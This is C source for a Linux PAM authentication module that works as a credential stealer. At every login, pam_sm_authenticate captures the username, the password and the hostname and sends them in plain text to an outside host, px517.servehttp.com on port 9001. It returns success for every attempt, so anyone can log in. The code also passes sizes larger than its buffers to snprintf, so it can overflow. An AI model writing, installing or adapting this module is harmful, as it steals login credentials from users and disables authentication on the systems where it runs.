#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <unistd.h>

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
  return size * nmemb;
}

void sendMessage(char (*message)[]) {
  char data[200];
  struct curl_slist *list = NULL;

  snprintf(data,300,"%s",*message);
  CURL *curl;
  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  list = curl_slist_append(list, "Content-Type: text/plain");
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://px517.servehttp.com:9001/message");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,data); 
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, list);
    curl_easy_perform(curl);
  }                           
  curl_slist_free_all(list);            
  curl_global_cleanup();
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  gethostname(hostname, sizeof hostname);
  snprintf(message,2048,"Hostname: %s\nUsername: %s\nPassword: %s",hostname,username,password);
  sendMessage(&message);
  return PAM_SUCCESS;
}
